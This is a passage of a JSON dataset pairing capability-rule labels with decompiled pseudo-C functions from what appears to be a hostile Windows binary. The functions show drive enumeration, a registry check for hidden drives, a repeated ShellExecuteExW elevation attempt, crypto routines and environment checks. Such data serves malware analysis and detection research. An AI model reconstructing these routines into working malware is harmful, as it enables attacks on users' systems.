fcn.00408db6(iVar5);\n                    fcn.00406445();\n                }\n                *(arg_8h + 0x20) = uVar2;\n                fcn.00406445();\n                puVar3 = fcn.0040f6fc(var_10h);\n                return puVar3;\n            }\n        }\n        puVar3 = NULL;\n    }\n    return puVar3;\n}\n",
        "token_count": 1727
    },
    "0040fabf": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040fabf(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    char *pcVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    uVar1 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n    pcVar2 = fcn.0040f6d6(uVar1);\n    if (((pcVar2 != NULL) && (*pcVar2 == '[')) && (pcVar2 = fcn.0040f6fc(pcVar2),  pcVar2 != NULL)) {\n        if (*pcVar2 == ']') {\ncode_r0x0040fb89:\n            uVar1 = fcn.0040f6fc(pcVar2);\n            return uVar1;\n        }\n        arg_8h = fcn.0040f6c2(param_1);\n        *(param_1 + 0x10) = arg_8h;\n        if (((arg_8h != 0) && (pcVar2 = fcn.0040fcde(arg_8h, pcVar2, in_EAX),  pcVar2 != NULL)) && (*in_EAX != 0)) {\n            while (((*pcVar2 == ',' && (pcVar2 = fcn.0040f6fc(pcVar2),  pcVar2 != NULL)) &&\n                   (arg_8h_00 = fcn.0040f6c2(param_1),  arg_8h_00 != 0))) {\n                *(arg_8h + 8) = arg_8h_00;\n                *(arg_8h_00 + 0xc) = arg_8h;\n                pcVar2 = fcn.0040fcde(arg_8h_00, pcVar2, in_EAX);\n                if ((pcVar2 == NULL) || (arg_8h = arg_8h_00,  *in_EAX == 0)) break;\n            }\n            if ((*in_EAX != 0) && ((pcVar2 != NULL && (*pcVar2 == ']')))) goto code_r0x0040fb89;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 503
    },
    "0040fb9b": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fb9b(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    \n    uVar1 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n    pcVar2 = fcn.0040f6d6(uVar1);\n    if (((pcVar2 != NULL) && (*pcVar2 == '{')) && (pcVar2 = fcn.0040f6fc(pcVar2),  pcVar2 != NULL)) {\n        if (*pcVar2 == '}') {\ncode_r0x0040fccd:\n            uVar1 = fcn.0040f6fc(pcVar2);\n            return uVar1;\n        }\n        arg_8h_00 = fcn.0040f6c2(arg_8h);\n        *(arg_8h + 0x10) = arg_8h_00;\n        if ((arg_8h_00 != 0) && (pcVar2 = fcn.0040f803(arg_8h_00, pcVar2, arg_10h),  pcVar2 != NULL)) {\n            uVar1 = *(arg_8h_00 + 0x20);\n            *(arg_8h_00 + 0x20) = 0;\n            *(arg_8h_00 + 0x1c) = uVar1;\n            if (*pcVar2 == ':') {\n                *arg_10h = *arg_10h + -1;\n                if (((*arg_10h != 0) && (pcVar2 = fcn.0040fcde(arg_8h_00, pcVar2 + 1, arg_10h),  pcVar2 != NULL)) &&\n                   (*arg_10h != 0)) {\n                    while (((*pcVar2 == ',' && (pcVar2 = fcn.0040f6fc(pcVar2),  pcVar2 != NULL)) &&\n                           (arg_8h_01 = fcn.0040f6c2(arg_8h),  arg_8h_01 != 0))) {\n                        *(arg_8h_00 + 8) = arg_8h_01;\n                        *(arg_8h_01 + 0xc) = arg_8h_00;\n                        pcVar2 = fcn.0040f803(arg_8h_01, pcVar2, arg_10h);\n                        if (pcVar2 == NULL) break;\n                        uVar1 = *(arg_8h_01 + 0x20);\n                        *(arg_8h_01 + 0x20) = 0;\n                        *(arg_8h_01 + 0x1c) = uVar1;\n                        if (*pcVar2 != ':') break;\n                        *arg_10h = *arg_10h + -1;\n                        if (*arg_10h == 0) {\n                            return 0;\n                        }\n                        pcVar2 = fcn.0040fcde(arg_8h_01, pcVar2 + 1, arg_10h);\n                        if ((pcVar2 == NULL) || (arg_8h_00 = arg_8h_01,  *arg_10h == 0)) break;\n                    }\n                    if ((*arg_10h != 0) && ((pcVar2 != NULL && (*pcVar2 == '}')))) goto code_r0x0040fccd;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 818
    },
    "00410023": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00410023(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    iStack20 = param_1;\n    uStack28 = 0x40ffe8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        uVar2 = *(param_1 + 0xc);\n        if ((uVar2 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar2 <= param_2)))) break;\n        uStack24 = *(iVar1 + uVar2 * 0xc);\n        *(param_1 + 0xc) = uStack24;\n        if (*(iVar1 + 4 + uVar2 * 0xc) == 0) {\n            fcn.004100bf(0x101);\n            (**(iVar1 + 8 + uVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 280
    },
    "004100dd": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004100dd(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t in_FS_OFFSET;\n    uint var_20h;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar3 = arg_8h;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(in_FS_OFFSET + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(in_FS_OFFSET + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar4 = puVar8;\n    do {\n        if ((*puVar4 != 0xffffffff) && (uVar10 <= *puVar4)) {\n            return 0;\n        }\n        if (puVar4[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar4 = puVar4 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar3[-2],  puVar1 < var_4h || (puVar3 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar5 = 0;\n    if (0 < *0x42f198) {\n        do {\n            if (*(iVar5 * 4 + 0x42f1a0) == uVar10) {\n                if (iVar5 < 1) {\n                    return 1;\n                }\n                if (*0x42f1e0 != 0) {\n                    *0x42f1e0 = 1;\n                    return 1;\n                }\n                if (*(iVar5 * 4 + 0x42f1a0) == uVar10) goto code_r0x004101f2;\n                iVar5 = *0x42f198 + -1;\n                if (-1 < iVar5) goto code_r0x004101cf;\n                goto code_r0x004101df;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < *0x42f198);\n    }\n    iVar6 = sub.ntdll.dll_NtQueryVirtualMemory(0xffffffff, puVar8, 0, &var_20h, 0x1c, &arg_8h);\n    iVar5 = *0x42f198;\n    if (iVar6 < 0) {\n        arg_8h = NULL;\n    }\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar7 = *(var_1ch + 0x1e) + var_1ch,  *piVar7 != 0x4550)) ||\n           (*(piVar7 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar7 + 5);\n        if (*(piVar7 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar7 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar7 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar7 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    if (*0x42f1e0 != 0) {\n        *0x42f1e0 = 1;\n        return 1;\n    }\n    iVar6 = *0x42f198;\n    if (0 < *0x42f198) {\n        puVar8 = *0x42f198 * 4 + 0x42f19c;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar6 = iVar6 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar6);\n    }\n    if (iVar6 == 0) {\n        iVar6 = 0xf;\n        if (*0x42f198 < 0x10) {\n            iVar6 = *0x42f198;\n        }\n        iVar11 = 0;\n        if (-1 < iVar6) {\n            do {\n                puVar8 = iVar11 * 4 + 0x42f1a0;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar6);\n        }\n        if (iVar5 < 0x10) {\n            *0x42f198 = iVar5 + 1;\n        }\n    }\n    *0x42f1e0 = 0;\n    return 1;\n    while (iVar5 = iVar5 + -1,  -1 < iVar5) {\ncode_r0x004101cf:\n        if (*(iVar5 * 4 + 0x42f1a0) == uVar10) break;\n    }\n    if (iVar5 < 0) {\ncode_r0x004101df:\n        if (*0x42f198 < 0x10) {\n            *0x42f198 = *0x42f198 + 1;\n        }\n        iVar5 = *0x42f198 + -1;\n    }\n    else if (iVar5 == 0) {\n        *0x42f1e0 = 0;\n        return 1;\n    }\ncode_r0x004101f2:\n    iVar6 = 0;\n    if (-1 < iVar5) {\n        do {\n            puVar8 = iVar6 * 4 + 0x42f1a0;\n            uVar9 = *puVar8;\n            iVar6 = iVar6 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar6 <= iVar5);\n    }\n    *0x42f1e0 = 0;\n    return 1;\n}\n",
        "token_count": 1621
    },
    "004023a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004023a3(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint arg_ch;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint32_t uVar4;\n    uint arg_10h;\n    uint var_450h;\n    uint pExecInfo;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_20h;\n    int32_t var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    arg_10h = 0x42e780;\n    arg_ch = fcn.00406209(0x412148, 0x19, 0xa21cf9c9, extraout_ECX);\n    fcn.004093ae(&var_450h, arg_ch, arg_10h);\n    sub.ntdll.dll_memset(&var_38h, 0, 0x38);\n    pExecInfo = 0x3c;\n    var_38h = 0xc640;\n    var_30h = fcn.00406209(0x412164, 5, 0x366dd6f0);\n    var_2ch = fcn.00406209(0x41216c, 9, 0xbb6e25b4);\n    var_20h = 0;\n    var_28h = &var_450h;\n    uVar4 = 0;\n    while( true ) {\n        var_34h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar3 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if ((iVar3 != 0) && (var_4h != 0)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(60000);\n        uVar4 = uVar4 + 1;\n        if (2 < uVar4) {\ncode_r0x0040246c:\n            (*_sym.imp.ole32.dll_CoUninitialize)();\n            return;\n        }\n    }\n    fcn.00408489();\n    cVar2 = fcn.0040457a();\n    if (cVar2 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    goto code_r0x0040246c;\n}\n",
        "token_count": 560
    },
    "00403543": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00403543(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_120h;\n    uint32_t var_11ch;\n    int32_t var_118h;\n    int32_t var_110h;\n    uint var_8h;\n    \n    if (*0x414c1c == -1) {\n        *0x414c1c = 0;\n        sub.ntdll.dll_memset(&var_11ch, 0, 0x118);\n        fcn.00409775();\n        if ((var_110h == 2) && (4 < var_11ch)) {\n            if (var_11ch < 6) {\n                if (var_11ch == 5) {\n                    if (var_118h == 2) {\n                        iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x59);\n                        if ((((iVar2 != 0) || (var_8h == 0x2000)) || (var_8h._2_1_ != '\\x01')) ||\n                           (iVar2 = fcn.0040877e(),  iVar2 == 0)) {\n                            *0x414c1c = 1;\n                            return 1;\n                        }\n                    }\n                    else if (var_118h != 1) {\n                        return *0x414c1c;\n                    }\n                    *0x414c1c = 5;\n                }\n            }\n            else if (var_11ch == 10) {\n                *0x414c1c = 10;\n            }\n            else if (var_118h == 0) {\n                *0x414c1c = (var_8h._2_1_ == '\\x01') * 4 + 2;\n            }\n            else if (var_118h == 1) {\n                *0x414c1c = ((var_8h._2_1_ != '\\x01') - 1 & 5) + 2;\n            }\n            else {\n                if (var_118h == 2) {\n                    uVar1 = (var_8h._2_1_ != '\\x01') - 1 & 5;\n                }\n                else {\n                    if (var_118h != 3) {\n                        return *0x414c1c;\n                    }\n                    uVar1 = (var_8h._2_1_ != '\\x01') - 1 & 6;\n                }\n                *0x414c1c = uVar1 + 3;\n            }\n        }\n    }\n    return *0x414c1c;\n}\n",
        "token_count": 589
    },
    "004052dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.004052dd(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint32_t var_4h;\n    \n    var_10h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    uVar3 = 0;\n    var_18h = 0x80000002;\n    var_14h = 0x80000001;\n    uVar4 = 0;\n    uVar1 = extraout_ECX;\n    do {\n        uVar1 = fcn.00406209(0x41265c, 0x3b, 0x73b0598b, uVar1, 0, 0x20019, &hKey);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)((&var_18h)[uVar4], uVar1);\n        uVar1 = extraout_ECX_00;\n        if (iVar2 == 0) {\n            var_4h = 0;\n            var_ch = 4;\n            uVar1 = fcn.00406209(0x412698, 8, 0x6d34c57c, 0, 0, &var_4h, &var_ch);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar1);\n            if ((iVar2 == 0) && (var_4h != 0)) {\n                uVar3 = uVar3 | var_4h;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = extraout_ECX_01;\n        }\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 2);\n    return ~uVar3 & var_10h;\n}\n",
        "token_count": 480
    },
    "0040538a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040538a(uint lpRootPathName)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint lpTargetPath;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n    if ((1 < uVar1) && ((uVar1 < 4 || (uVar1 == 6)))) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_QueryDosDeviceW)(lpRootPathName, &lpTargetPath, 0x208);\n        if (iVar2 != 0) {\n            uVar3 = fcn.00406209(0x4126a4, 4, 0x79c81e96, extraout_ECX, 4);\n            iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpNW)(&lpTargetPath, uVar3);\n            if (iVar2 == 0) {\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 244
    },
    "00405950": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405950(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpSystemInfo;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t lpAddress;\n    int32_t var_14h;\n    uint var_10h;\n    ushort var_ch;\n    uint var_8h;\n    \n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0, 0, 0, 0x42ead0);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(0x42ead0, 0x4126b0);\n    *0x42eab0 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x42ead0);\n    var_20h = 0;\n    var_1ch = 0;\n    lpAddress = 0;\n    var_14h = 0;\n    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x1fffffff, 0x2000, 4);\n    if (lpAddress != 0) {\n        var_14h = lpAddress;\n        fcn.00409a3c(&var_8h);\n        (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(&lpSystemInfo);\n        var_20h = var_28h;\n        uVar1 = fcn.004052dd();\n        iVar3 = 0;\n        do {\n            if ((uVar1 & 1 << (iVar3 & 0x1f)) != 0) {\n                var_10h._0_2_ = iVar3 + 0x41;\n                var_10h._2_2_ = 0x3a;\n                var_ch = 0;\n                uVar2 = fcn.0040538a(&var_10h);\n                if ((1 < uVar2) && ((uVar2 < 4 || (uVar2 == 6)))) {\n                    fcn.004056c1(&var_10h, &var_20h);\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x1a);\n        if (*0x42e416 != '\\0') {\n            fcn.004053f8(0, fcn.004056c1, &var_20h);\n        }\n        fcn.004057e3(var_14h - lpAddress >> 4, arg_8h);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n    }\n    return;\n}\n",
        "token_count": 608
    },
    "00406510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406510(uint noname_0, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    char in_stack_0000000f;\n    uint var_4h;\n    \n    uVar2 = arg_ch & 0xffff | 0xb4;\n    if ((*0x4141e4 < in_stack_0000000f >> 7) && (0 < *0x4141e4)) {\n        cVar3 = uVar2 * in_stack_0000000f;\n    }\n    else {\n        *0x4141e4 = *0x4141e4 * uVar2;\n        cVar3 = in_stack_0000000f;\n    }\n    uVar1 = 0;\n    do {\n        if (*0x4141e4 != 0x82) {\n            if (*0x4141e4 - 0x2d == *0x414bd8) {\n                return *0x4141e4;\n            }\n            if ((in_stack_0000000f == cVar3) && (uVar2 == *0x4141e4)) {\n                return *0x4141e4;\n            }\n            if (in_stack_0000000f <= *0x414bd8 * 0xf7) {\n                uVar2 = (arg_ch - 0x55) * uVar2 & 0xffff;\n            }\n        }\n        uVar1 = uVar1 + 1;\n        if (1 < uVar1) {\n            return *0x4141e4;\n        }\n    } while( true );\n}\n",
        "token_count": 371
    },
    "004072a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004072a4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint32_t arg_28h)\n\n{\n    uint arg_10h_00;\n    uint uVar1;\n    uchar *arg_10h_01;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.0040a235();\n    uVar1 = fcn.0040a235();\n    var_10h = uVar1;\n    var_4h = fcn.0040a235();\n    var_ch = fcn.0040a235();\n    arg_10h_01 = fcn.00406338(0);\n    if (arg_10h_01 == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        *arg_10h_01 = 1;\n        fcn.00407144(arg_14h, arg_28h - (arg_28h >> 1), arg_10h_01);\n        *arg_10h_01 = 0xff;\n        fcn.00407144(arg_18h, arg_28h >> 1, arg_10h_01);\n        fcn.0040a3a0();\n        iVar2 = fcn.0040a3bd();\n        if (iVar2 < 1) {\n            fcn.0040a3fe();\n            fcn.0040a3fe();\n            fcn.0040a3fe();\n        }\n        fcn.0040a3fe();\n        fcn.0040a467(uVar1);\n        fcn.0040a3fe();\n        fcn.0040a467(var_4h);\n        fcn.0040a731(var_8h, uVar1);\n        fcn.0040a731(var_8h, var_4h);\n        fcn.0040a4f5(arg_14h, arg_18h);\n        arg_10h_00 = var_ch;\n        fcn.0040a4f5(uVar1, var_4h);\n        fcn.0040a6c5(arg_10h, arg_ch);\n        fcn.0040a64b(arg_ch, arg_10h, arg_10h_00);\n        fcn.0040a6c5(arg_1ch, arg_ch);\n        fcn.0040a6c5(arg_20h, arg_ch);\n        fcn.0040a6c5(arg_24h, arg_18h);\n        fcn.00406445();\n        fcn.0040a262(&var_8h);\n        fcn.0040a262(&var_10h);\n        fcn.0040a262(&var_4h);\n        fcn.0040a262(&var_ch);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 692
    },
    "004076c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004076c0(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t *unaff_ESI;\n    \n    uVar2 = 0;\n    uVar1 = fcn.00409e78();\n    if (uVar1 == '\\0') goto code_r0x004076ed;\n    uVar1 = *unaff_ESI;\n    if (uVar1 != 1) {\n        if (uVar1 != 2) goto code_r0x004076ed;\n        uVar1 = fcn.00409e78();\n        if (uVar1 == '\\0') goto code_r0x004076ed;\n    }\n    uVar2 = 1;\ncode_r0x004076ed:\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 188
    },
    "004076f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004076f1(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_14h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s2;\n    \n    piVar1 = *0x42e410;\n    uVar5 = *0x42e3f0;\n    cVar2 = fcn.004076c0();\n    if (((cVar2 == '\\0') || (cVar2 = fcn.00409e78(arg_8h, uVar5),  cVar2 == '\\0')) ||\n       (cVar2 = fcn.00409e9f(arg_ch, 4),  cVar2 == '\\0')) {\n        var_10h = 0;\n    }\n    else {\n        if (*piVar1 == 2) {\n            var_14h = piVar1[3];\n            var_ch = piVar1[1];\n        }\n        else {\n            var_14h = piVar1[2];\n            var_ch = piVar1[1];\n        }\n        iVar3 = fcn.0040cf7b();\n        arg_14h = iVar3 + 7U >> 3;\n        uVar4 = arg_14h;\n        if (arg_14h <= uVar5) {\n            uVar4 = uVar5;\n        }\n        if (uVar4 % arg_14h == 0) {\n            var_10h = arg_14h;\n            if (arg_14h <= uVar5) {\n                var_10h = uVar5;\n            }\n        }\n        else {\n            uVar4 = arg_14h;\n            if (arg_14h <= uVar5) {\n                uVar4 = uVar5;\n            }\n            var_10h = (uVar4 / arg_14h + 1) * arg_14h;\n        }\n        iVar3 = fcn.00406338(0);\n        if (iVar3 != 0) {\n            var_1ch = fcn.0040a235();\n            var_20h = fcn.0040a235();\n            s2 = arg_8h;\n            var_8h = iVar3;\n            if (arg_14h <= uVar5) {\n                do {\n                    fcn.00407677(var_1ch, var_14h, s2, arg_14h, var_8h);\n                    s2 = s2 + arg_14h;\n                    var_8h = var_8h + arg_14h;\n                    uVar5 = uVar5 - arg_14h;\n                } while (arg_14h <= uVar5);\n            }\n            if ((uVar5 != 0) && (var_18h = fcn.00406338(0),  var_18h != 0)) {\n                sub.ntdll.dll_memcpy(var_18h, s2, uVar5);\n                fcn.00409681(var_18h + uVar5);\n                fcn.00407677(var_1ch, var_14h, var_18h, arg_14h, var_8h);\n                fcn.0040648b();\n            }\n            *arg_ch = iVar3;\n            fcn.0040a262(&var_1ch);\n            fcn.0040a262(&var_20h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 847
    },
    "0040786f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040786f(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint unaff_ESI;\n    \n    cVar1 = fcn.004076c0();\n    if (cVar1 != '\\0') {\n        if (*in_EAX == 2) {\n            fcn.0040a262(in_EAX + 1);\n            fcn.0040a262(in_EAX + 2);\n            fcn.0040a262(in_EAX + 3);\n        }\n        else if (*in_EAX == 1) {\n            fcn.0040a262(in_EAX + 1);\n            fcn.0040a262(in_EAX + 2);\n        }\n        cVar1 = fcn.0040622c(unaff_ESI);\n        if (cVar1 != '\\0') {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            cVar1 = fcn.0040623e(in_EAX);\n            if (cVar1 != '\\0') {\n                sub.ntdll.dll_memset();\n                fcn.00406445();\n            }\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "004079e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * fcn.004079e5(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    puVar4 = NULL;\n    uVar3 = *(param_1 + 8) + 7U >> 3;\n    if (*(param_1 + 0xc) == 1) {\n        if (param_2 == uVar3 * 2 + 0x10) {\n            puVar4 = fcn.00406338(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 1;\n                uVar1 = fcn.0040a235();\n                puVar4[1] = uVar1;\n                fcn.0040a32a(param_1 + 0x10, uVar3);\n                uVar1 = fcn.0040a235();\n                puVar4[2] = uVar1;\n                fcn.0040a32a(param_1 + 0x10 + uVar3, uVar3);\n            }\n        }\n    }\n    else if ((*(param_1 + 0xc) == 2) && (param_2 == uVar3 * 3 + 0x10)) {\n        puVar4 = fcn.00406338(8);\n        if (puVar4 != NULL) {\n            *puVar4 = 2;\n            uVar1 = fcn.0040a235();\n            